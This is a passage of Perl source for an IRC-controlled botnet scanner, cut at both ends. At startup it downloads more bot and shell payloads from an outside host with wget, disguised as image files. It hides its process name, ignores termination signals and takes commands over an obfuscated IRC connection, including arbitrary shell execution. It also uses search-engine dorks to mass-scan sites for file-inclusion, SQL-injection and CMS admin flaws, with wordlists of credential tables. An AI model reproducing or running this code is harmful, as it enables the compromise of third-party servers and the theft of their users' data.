             'Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',
             'Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1',
             'Mozilla/5.0 (compatible;bingbot/2.0;+http://www.bing.com/bingbot.htm)',
             'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)');
            
my $uagent    = $uagents[rand(scalar(@uagents))];
my $lfdtest   = "../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000";
my $open_test = "/admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html";
my $adm_output = ("uid=");
my $open_output = ("FCKeditor - Connectors Tests");

my @tabele      = ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario','name','names','nombre','nombres',
               'usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator','passwd',
               'administrators','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','mods',
               'user_name','user_names','member_password','mod','moderators','moderator','user_email','user_emails','user_mail',
               'user_mails','mail','emails','email','address','e-mail','emailaddress','correo','correos','phpbb_users','log',
               'logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass','tpassword','tPassword',
               'u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave',
               'login_id','pwd','pas','sistema_id','sistema_usuario','sistema_password','contrasena','auth','key','senha',
               'tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member','tb_users','tb_user','tb_sys','sys',
               'fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account',
               'accnts','associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers',
               'utilisateurs','password','amministratore','god','God','authors','asociado','asociados','autores','membername',
               'autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','paypal','credit','bank','transaction',
               'order','account','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny      = ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
               'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
               'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
               'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
               'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
               'paypal','credit','bank','transaction','order','account','user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password',
               'autor','upassword','web_password','web_username');

my %conf = (
  shchan => 1,      # Shell info shown in $shchn
  ssfind => 0,      # Show search engine founded sites
  ssdone => 0,      # Show when scan is done
  soscos => 1,      # Show osco meby vurln sites
  stindb => 0      # Show TIMTHUMB results for debug
);

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
chdir("/tmp");
chop (my $priper = `wget http://blogger.com.midislandrental.com/.mods/pbot.txt -O pbot.jpg && rm -rf pbot.jpg.* && wget http://blogger.com.midislandrental.com/.mods/sh.txt -O sh.jpg && rm -rf sh.jpg.* && wget http://blogger.com.midislandrental.com/.mods/sd.txt -O sl.jpg && rm -rf sl.jpg.*`);
$verbindingen = $verbindnaar[rand(scalar(@verbindnaar))];
$verbindport = $deurtje[rand(scalar(@deurtje))];
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$faceproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
my @domen = ('biz','info','org','net','edu','gov','mil','ps','gr','off.ai','vu','kw','com.uy','aq','vg','lk','gw','eh','lv','sj','com.na','na','bv','com.ph','ph','ca','mp','td','be','kh','com.mx','mx','com.jm','jm','zr','com.ni','ni','com.gi','gi','th','co.th','co.ke','ke','va','it','to','kg','com.bo','bo','com.mt','tm','ge','co.ls','ls','mz','sc','ee','tc','com.bz','bz','cv','co.kr','co.cr','cr','am','yu','com.ar','ar','li','ne','re','co.il','il','com.pr','pr','com.et','et','co.id','id','iq','nc','co.in','sh','com.my','my','hr','bs','com.ec','ec','ba','ad','co.za','nl','cl','nz','co.nz','co.hu','hu','bg','is','co.uk','tf','er','gh','eu','uz','en','ie','co.im','la','fr','cd','co.ug','lc','tt','zw','com.bd','bd','ro','cf','io','an','pn','mh','ye','dm','sr','cn','bb','ru','mm','ms','hm','kn','tk','bt','fo','lr','pk','com.tj','com.ly','ly','com.sb','sb','tg','mt','si','lb','com.af','af','bj','jo','ax','pg','com.br','br','mr','ml','km','co.zm','ma','gb','kz','yt','mw','sd','mn','ky','bf','gm','kp','a1','lt','ch','lu','qa','ci','um','pa','com.pa','in','st','rw','ga','as','cx','co.ck','ck','sl','ht','co.ve','cz','com.pe','pe','md','bi','com.nf','nf','com.vn','me','tl','so','com.co','co','gn','gs','mo','fi','no','co.bw','bw','tv','bn','dz','co.vi','cm','com.om','om','com.do','do','pf','com.vc','nr','aw','sm','ao','mu','fm','gl','by','es','fk','gt','com.gt','co.je','hn','at','al','pw','mc','o1','ai','ua','ap','com.hk','hk','cy','com.pk','gp','eg','wf','kr','gf','com.au','pm','ae','us','com.np','np','cu','com.cu','fx','com.py','py','cs','gu','gd','pt','sz','tz','cg','sn','sy','pl','tr','com.sa','sa','ki','dj','ir','rs','com.sg','sg','ng','tn','mg','ws','com.tr','com.fj','fj','mq','sk','gq','mk','a2','nu','com.sv','sv','gy','mv','de','com.ag','ag','se','bh','com.tw','tw','cc','co.jp','jp','az');
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
      $irc_servers{$IRC_cur_socket}{'host'} = $ircserver_con;
        $irc_servers{$IRC_cur_socket}{'port'} = $ircport_con;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$nob0dy");
        sleep (1);}}
my $ssssss = reverse(decode_base64(uri_unescape($verbindingen))); $ssss = uri_unescape($ssssss);
my $pppppp = reverse(decode_base64(uri_unescape($verbindport))); $pppp = uri_unescape($pppppp);
my $inj = reverse(decode_base64(uri_unescape($inject0r))); my $injector  = uri_unescape($inj);
my $bots = reverse(decode_base64(uri_unescape($b0tshell))); my $botshell  = uri_unescape($bots);
my $bota = reverse(decode_base64(uri_unescape($b0tak))); my $botak = uri_unescape($bota);
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(1));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +ixp");
        sendraw("JOIN $channel");
        sleep(2);
    }
   elsif ($servarg =~ /002/ ) { sendraw("JOIN $channel");sleep(2); }
   elsif ($servarg =~ /003/ ) { sendraw("JOIN $channel");sleep(2); }
   elsif ($servarg =~ /004/ ) { sendraw("JOIN $channel");sleep(2); }
   elsif ($servarg =~ /005/ ) { sendraw("JOIN $channel");sleep(2); }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { &connector("$nickname", "$ssss", "$pppp"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
         my $engine = 'Google,Google2,GigaBlast,EuroSeek,Alltheweb,Bing,Mamma,Altavista,Ask,Uol,Yahoo,Yahoo2,Clusty,Gutser,Rediff,Virgilio,Webde,Exalead,Lycos,Hotbot,Aol,Sapo,Duck,Yause,Baidu,Black,Onet,Sizuka,Walla,Demos,Rose,Seznam,Tiscali,Naver,AmiDalLa,BusCaR,KvaSiR,eXciTe,InteRia,SnZ,RambLer,YaNdeX,NetSprint,sAol,Lookle,optusZoo,Search66,Arrama,eXciteJP,BigLobe,Clix,SearchCH,Cada';
            if ($path eq $mynick) {
                if ($msg =~ /^ PING (.*) /) {
                    sendraw("NOTICE $nick : PING $1 ");
                }
                if ($msg =~ /^ VERSION /) {
                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");
                }
                if ($msg =~ /^ TIME /) {
                    sendraw("NOTICE $nick : TIME ".$datetime." ");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :0,1Fake Process/PID : $fakeproc - $$");
                }
             if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^$cmdlfi\s+(.*?)\s+(.*)/){
               my $url = $1.$lfdtest;
               my $cmd = $2;
               &cmdlfi($url,$cmd,$nick);
            }
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^$cmdxml\s+(.*?)\s+(.*)/){
               my $url = $1;
               my $cmd = $2;
               &cmdxml($url,$cmd,$nick);
            }
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^$cmde107\s+(.*?)\s+(.*)/){
               my $url = $1;
               my $cmd = $2;
               &cmde107($url,$cmd,$nick);
            }
           }
            else {
                if ($path =~ $channel && &isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
                    &shell("$path","$1");
                }
            ##################################################################### HIT
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^$cmdlfi\s+(.+?)\s+(.*)/){
               my $url = $1.$lfdtest;
               my $cmd = $2;
               &cmdlfi($url,$cmd,$path);
            }
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^$cmdxml\s+(.+?)\s+(.*)/){
               my $url = $1;
               my $cmd = $2;
               &cmdxml($url,$cmd,$path);
            }
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^$cmde107\s+(.+?)\s+(.*)/){
               my $url = $1;
               my $cmd = $2;
               &cmde107($url,$cmd,$path);
            }
                ##################################################################### HELP COMMAND
                if ($path =~ $channel && $msg=~ /^!help/) {
                    my $helplogo = "12(4@0Help12)";
                    &msg("$path","$helplogo 6################################################### ");
               &msg("$path","$helplogo 6# !domrfi  / !domlfi / !domtim 14ªª 12[0bug12] [0dork12] AUTO ADD RANDOM DOMAIN 14´´ 6# ");
                    &msg("$path","$helplogo 6# $rficmd  / $lficmd / $lfdcmd / $sqlcmd / $xmlcmd / $timcmd 14ªª 12[0bug12] [0dork12] 14´´ 6# ");
                    &msg("$path","$helplogo 6# $cmde107 / $cmdlfi / $cmdxml 14ªª12 [0target12] [0cmd12] 14´´  6# ");
                    &msg("$path","$helplogo 6# $e107cmd / $oscocmd / $cpancmd / $zencmd / $admcmd 12[0dork12] 14||| 6# ");
                    &msg("$path","$helplogo 6################################################### ");
                }
                if ($path =~ $channel && $msg=~ /^!engine/) {
                    my $enginelogo = "12(4@0Engine12)";
               &msg("$path","9$enginelogo 13 Google, Google2, GigaBlast, EuroSeek, Alltheweb, Bing, Mamma, Altavista, Ask, Uol, Yahoo, Yahoo2, Clusty,");
               &msg("$path","9$enginelogo 13 Gutser,Rediff, Virgilio, Webde, Exalead, Lycos, Hotbot, Aol, Sapo, Duck, Yause, Baidu, Black, Onet, Sizuka,");
               &msg("$path","9$enginelogo 13 Walla, Demos, Rose, Seznam, Tiscali, Naver, AmiDalLa, BusCaR, KvaSiR, eXciTe, InteRia, SnZ, RambLer, YaNdeX,");
               &msg("$path","9$enginelogo 13 NetSprint, sAol, Lookle, optusZoo, Search66, Arrama, eXciteJP, BigLobe, Clix, SearchCH, Cada");
                }
                if ($path =~ $channel && $msg=~ /^!about/) {
                    my $aboutlogo = "13(8@0About Bot13)";
                    &msg("$path","$aboutlogo 13Fuckin Multi Scanner Owned By 4,1CraZy8Creation9Zzz ");
                }
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^!cinj\s+(.*)/) {
               my ($url) = ($1);
               $injector = $url;
               &msg("$path","12[0Injector12] 14ªª 9$url 14´´");
            }
            if ($path =~ $channel && &isAdmin($nick) && $msg=~ /^!cbsh\s+(.*)/) {
               my ($url) = ($1);
               $botshell = $url;
               &msg("$path","12[0BotShell12] 14ªª 9$url 14´´");
            }      
                if ($path =~ $channel && $msg=~ /^!respon/ || $msg=~ /^!id/) {
                    if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                        &msg("$path","12[0Injector12] 14ªª 9OKE 14´´ ");
                    } else {
                        &msg("$path","12[0Injector12] 14ªª 13ERROR 14´´ ");
                    }
                }
                if ($path =~ $channel && &isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","0,1Fake Process/PID : 8$fakeproc - $$");
                }
            
                ##################################################################### RFI SCAN
                if ($path =~ $channel && $msg=~ /^$rficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$rfilogo 13Dork :9 $dork");
                            &msg("$path","$rfilogo 13Bugz :9 $bug");
                            &msg("$path","$rfilogo 9==14L9=15O9=0A9=0D9=0I9=15N9=14G9== ");
                            &scan_start($path,$bug,$dork,$engine,1);
                        }
                  exit;
                    }
                }
            ##################################################################### DOMRFI
            if ($path =~ $channel && $msg=~ /^!domrfi\s+(.+?)\s+(.*)/ ) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
                  if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,"".$2." site:.".$domens);
                                &msg("$path","$rfilogo 13Dork :9 $dork");
                                &msg("$path","$rfilogo 13Bugz :9 $bug");
                                &msg("$path","$rfilogo 9==14L9=15O9=0A9=0D9=0I9=15N9=14G9== ");
                                &scan_start($path,$bug,$dork,$engine,1);
                            } else {
                                &msg("$path","12[0 $nick 12] $rfilogo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }exit;
                  }
                  }
                }
            }
            ##################################################################### tim RFI SCAN
                if ($path =~ $channel && $msg=~ /^$timcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                     if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                        my ($bug,$dork) = ($1,$2);
                        &msg("$path","$timlogo 13Dork :9 $dork");
                        &msg("$path","$timlogo 13Bugz :9 $bug");
                        &msg("$path","$timlogo 9==14L9=15O9=0A9=0D9=0I9=15N9=14G9== ");
                        &scan_start($path,$bug,$dork,$engine,16);
                     }
                        }
                        exit;
                    }
                }
            ##################################################################### DOM tim RFI SCAN
            if ($path =~ $channel && $msg=~ /^!domtim\s+(.+?)\s+(.*)/ ) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
                     if (fork) { exit; } else {
                                my ($bug,$dork) = ($1,"".$2." site:.".$domens);
                                &msg("$path","$timlogo 13Dork :9 $dork");
                                &msg("$path","$timlogo 13Bugz :9 $bug");
                                &msg("$path","$timlogo 9==14L9=15O9=0A9=0D9=0I9=15N9=14G9== ");
                                &scan_start($path,$bug,$dork,$engine,16);
                     }
                  exit;
                  }
                }
            }
            ##################################################################### LFD SCAN
                if ($path =~ $channel && $msg=~ /^$lfdcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$lfdlogo 12Dork :4 $dork");
                            &msg("$path","$lfdlogo 12Bugz :4 $bug");
                            &msg("$path","$lfdlogo 8==14L8=15O8=0A8=0D8=0I8=15N8=14G8== ");
                            &lfd_start($path,$bug,$dork,$engine,14);
                        }
                        exit;
                    }
                }
            ##################################################################### PmWiki
                if ($path =~ $channel && $msg=~ /^$pmwicmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ("pmwiki.php",$1);
                                &msg("$path","$pmwilogo 13Dork :9 $dork");
                                &msg("$path","$pmwilogo 13Bugz :9 $bug");
                                &msg("$path","$pmwilogo 10==14L10=15O10=0A10=0D10=0I10=15N10=14G10== ");
                                &scan_start($path,$bug,$dork,$engine,17);
                            } else {
                                &msg("$path","12[0 $nick 12] $pmwilogo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }
                        }
                        exit;
                    }
                }
                ##################################################################### LFIRCE SCAN
                if ($path =~ $channel && $msg=~ /^$lficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$lfilogo 13Dork :9 $dork");
                                &msg("$path","$lfilogo 13Bugz :9 $bug");
                                &msg("$path","$lfilogo 8==14L8=15O8=0A8=0D8=0I8=15N8=14G8== ");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","12[0 $nick 12] $lfilogo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }
                        }
                        exit;
                    }
                }
            ##################################################################### DOMLFI
            if ($path =~ $channel && $msg=~ /^!domlfi\s+(.*?)\s+(.*)/ ) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
                  if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,"".$2." site:.".$domens);
                                &msg("$path","$lfilogo 13Dork :9 $dork");
                                &msg("$path","$lfilogo 13Bugz :9 $bug");
                                &msg("$path","$lfilogo 8==14L8=15O8=0A8=0D8=0I8=15N8=14G8== ");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","12[0 $nick 12] $lfilogo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }exit;
                  }
                }
                    }
            }
                ##################################################################### e107 contact.php SCAN
                if ($path =~ $channel && $msg=~ /^$e107cmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ("contact.php",$1);
                                &msg("$path","$e107logo 13Dork :9 $dork");
                                &msg("$path","$e107logo 13Bugz :9 $bug");
                                &msg("$path","$e107logo 10==14L10=15O10=0A10=0D10=0I10=15N10=14G10== ");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","12[0 $nick 12] $e107logo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }
                        }
                        exit;
                    }
                }
            ##################################################################### DOME107
            if ($path =~ $channel && $msg=~ /^!dome107\s+(.+)/ ) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
                  if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ("contact.php","".$1." site:.".$domens);
                                &msg("$path","$e107logo 13Dork :9 $dork");
                                &msg("$path","$e107logo 13Bugz :9 $bug");
                                &msg("$path","$e107logo 10==14L10=15O10=0A10=0D10=0I10=15N10=14G10== ");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","12[0 $nick 12] $e107logo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }exit;
                  }
                }
                    }
            }
            ##################################################################### XML SCAN
            if ($path =~ $channel && $msg=~ /^$xmlcmd\s+(.*?)\s+(.*)/ ) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$xmllogo 13Dork :9 $dork");
                                &msg("$path","$xmllogo 13Bugz :9 $bug");
                                &msg("$path","$xmllogo 11==14L11=15O11=0A11=0D11=0I11=15N11=14G11== ");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","12[0 $nick 12] $xmllogo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }
                        }
                        exit;
                    }
                }
            ##################################################################### DOMXML
            if ($path =~ $channel && $msg=~ /^!domxml\s+(.*?)\s+(.*)/ ) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
                  if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,"".$2." site:.".$domens);
                                &msg("$path","$xmllogo 13Dork :9 $dork");
                                &msg("$path","$xmllogo 13Bugz :9 $bug");
                                &msg("$path","$xmllogo 11==14L11=15O11=0A11=0D11=0I11=15N11=14G11== ");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","12[0 $nick 12] $xmllogo 4==14E4=15R4=0R4=15O4=14R4== ");
                            }exit;
                  }
                }
                    }
            }
                ##################################################################### SQL SCAN
                if ($path =~ $channel && $msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$sqllogo 13Dork :9 $dork");
                            &msg("$path","$sqllogo 13Bugz :9 $bug");
                            &msg("$path","$sqllogo 7==14L7=15O7=0A7=0D7=0I7=15N7=14G7== ");
                            &scan_start($path,$bug,$dork,$engine,5);
                        }
                        exit;
                    }
                }
                ##################################################################### OSCO SCAN
                if ($path =~ $channel && $msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug0,$dork) = ("admin/categories.php/login.php",$1);
                     my ($bug1,$dork) = ("admin/file_manager.php/login.php",$1);
                     my ($bug2,$dork) = ("admin/banner_manager.php/login.php",$1);
                     my ($bug3,$dork) = ("admin/categories.php/login.php?cPath=&action=new_product_preview",$1);
                     &msg("$path","$oscologo 13Dork :9 $dork ");
                            &msg("$path","$oscologo 4==14L4=15O4=0A4=0D4=0I4=15N4=14G4== ");
                            &scan_start($path,$bug0,$dork,$engine,6);sleep(1);
                     &scan_start($path,$bug1,$dork,$engine,7);sleep(1);
                     &scan_start($path,$bug2,$dork,$engine,13);sleep(1);
                     &scan_start($path,$bug3,$dork,$engine,15);
                        }
                        exit;
                    }
                }
            ##################################################################### DOMOSCO SCAN
            if ($path =~ $channel && $msg=~ /^!domosco\s+(.*)/) {
               if (my $pid = fork) {
                  waitpid($pid, 0);
               }
               else {
                  foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
                     if (fork) { exit; } else {
                        my ($bug0,$dork) = ("admin/categories.php/login.php","".$1." site:.".$domens);
                        my ($bug1,$dork) = ("admin/file_manager.php/login.php","".$1." site:.".$domens);
                        my ($bug2,$dork) = ("admin/banner_manager.php/login.php","".$1." site:.".$domens);
                        my ($bug3,$dork) = ("admin/categories.php/login.php?cPath=&action=new_product_preview","".$1." site:.".$domens);
                        &msg("$path","$oscologo 13Dork:9 $dork ");
                        &msg("$path","$oscologo 4==14L4=15O4=0A4=0D4=0I4=15N4=14G4== ");
                        &scan_start($path,$bug0,$dork,$engine,6);sleep(1);
                        &scan_start($path,$bug1,$dork,$engine,7);sleep(1);
                        &scan_start($path,$bug2,$dork,$engine,13);sleep(1);
                        &scan_start($path,$bug3,$dork,$engine,15);
                     }
                  exit;
                  }
                    }
                }
                ##################################################################### CPANEL SCAN
               if ($path =~ $channel && $msg=~ /^$cpancmd\s+(.*)/) {
                  if (my $pid = fork) { waitpid($pid, 0); } else {
                     if (fork) { exit; } else {
                           my ($bug,$dork) = ("admin/content.php?act=tambahuser",$1);
                           &msg("$path","$cpanlogo 13Dork :9 $dork");
                           &msg("$path","$cpanlogo 7==14L7=15O7=0A7=0D7=0I7=15N7=14G7== ");
                           &scan_start($path,$bug,$dork,$engine,8);
                                          
                     }
                     exit;
               }
            }
            if ($path =~ $channel && $msg=~ /^$cpancmd\s+(.*)/) {
                  if (my $pid = fork) { waitpid($pid, 0); } else {
                     if (fork) { exit; } else {
                           my ($bug,$dork) = ("admin/content.php?module=user",$1);
                           &scan_start($path,$bug,$dork,$engine,9);
                                          
                     }
                     exit;
               }
            }
            ##################################################################### PhpMyAdmin SCAN
            if ($path =~ $channel && $msg=~ /^$admcmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("phpMyAdmin/config/config.inc.php",$1);
                            &msg("$path","$admlogo 13Dork :9 $dork");
                            &msg("$path","$admlogo 11==14L11=15O11=0A11=0D11=0I11=15N11=14G11==");
                            &scan_start($path,$bug,$dork,$engine,10);
                        }
                        exit;
                    }
                }
               ##################################################################### OPENCART SCAN
                if ($path =~ $channel && $msg=~ /^$opcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$oplogo 3Dork :4 $dork");
                            &msg("$path","$oplogo 6Bugz :4 $bug");
                            &msg("$path","$oplogo 12Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,11);
                        }
                        exit;
                    }
                }
                ##################################################################### ZEN SCAN
                if ($path =~ $channel && $msg=~ /^$zencmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("admin/sqlpatch.php/password_forgotten.php?action=execute",$1);
                            &msg("$path","$zenlogo 3Dork :4 $dork");
                            &msg("$path","$zenlogo 12Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,12);
                        }
                        exit;
                    }
                }
                ##################################################################### ZEN SCAN
                if ($path =~ $channel && $msg=~ /^$zencmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("admin/record_company.php",$1);
                            &scan_start($path,$bug,$dork,$engine,12);
                        }
                        exit;
                    }
                }
            #####################################################################
            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

#########################################
sub type () {
my ($chan,$bug,$dork,$engine,$type) = @_;
   if ($type == 1){$type=&rfi($chan,$bug,$dork,$engine);}
